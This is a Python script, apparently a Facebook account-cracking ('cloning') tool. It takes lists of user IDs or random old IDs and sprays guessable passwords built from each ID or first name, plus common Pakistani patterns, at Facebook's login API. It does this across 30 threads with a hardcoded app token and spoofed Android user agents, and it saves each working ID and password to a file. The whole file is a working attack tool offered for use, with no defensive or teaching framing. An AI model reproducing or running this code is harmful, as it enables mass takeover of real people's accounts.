import os, sys, time, random, string, requests, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- [ STORAGE FIX ] ---
def real_storage():
    if not os.path.exists('/sdcard/EXECUTOR_RESULTS'):
        os.system('mkdir -p /sdcard/EXECUTOR_RESULTS')
    return "/sdcard/EXECUTOR_RESULTS"

path_save = real_storage()
loop = 0
oks = []
cps = []

def get_ua_pro():
    ver = random.choice(['12','13','14','15'])
    model = random.choice(['SM-S928B', 'Pixel-8-Pro', 'V2303', 'CPH2581'])
    fb_ver = f"{random.randint(440, 500)}.0.0.{random.randint(10, 99)}"
    return f"Dalvik/2.1.0 (Linux; U; Android {ver}; {model} Build/UP1A.{random.randint(230000, 239999)}.001) [FBAN/FB4A;FBAV/{fb_ver};FBBV/{random.randint(500000000, 600000000)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/arm64-v8a:;]"

def banner():
    os.system('clear')
    print("\033[1;31m  ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗")
    print("\033[1;31m  ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝")
    print("\033[1;31m  █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ")
    print("\033[1;37m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def crack_real_system(uid, name):
    global loop, oks, cps
    sys.stdout.write(f'\r \033[1;37m[MASTER] {loop} | \033[1;32mOK:{len(oks)} | \033[1;31mCP:{len(cps)} '); sys.stdout.flush()
    first = name.split(' ')[0].lower() if ' ' in name else name.lower()
    pws = [uid, uid[6:], first+'123', first+'786', 'pakistan', '786786']
    
    for pw in pws:
        if len(pw) < 6: continue
        session = requests.Session()
        headers = {'user-agent': get_ua_pro(), 'content-type': 'application/x-www-form-urlencoded'}
        data = {"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "email": uid, "password": pw, "generate_session_cookies": "1"}
        try:
            res = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers).json()
            if "session_key" in res:
                print(f'\n\033[1;32m [OK] {uid} | {pw}')
                oks.append(uid)
                open(f"{path_save}/OK.txt", "a").write(f"{uid}|{pw}\n")
                break
            elif "checkpoint" in str(res):
                cps.append(uid)
                break
        except: pass
    loop += 1

def start_system():
    banner()
    print(" [1] File Cloning")
    print(" [2] Random Old ID")
    opt = input("\n [?] Selection : ")
    
    if opt == '1':
        path = input(" [+] File Path : ")
        ids = open(path, 'r').read().splitlines()
        banner()
        # --- YE RAHI FIX LINE ---
        with tred(max_workers=30) as engine:
            for user in ids:
                u = user.split('|')[0]
                n = user.split('|')[1] if '|' in user else "User"
                engine.submit(crack_real_system, u, n)
    elif opt == '2':
        limit = int(input(" [?] Limit : "))
        ids = ["100000" + "".join(random.choices(string.digits, k=9)) + "|Old User" for _ in range(limit)]
        banner()
        with tred(max_workers=30) as engine:
            for user in ids:
                u, n = user.split('|')
                engine.submit(crack_real_system, u, n)

if __name__ == "__main__":
    start_system()
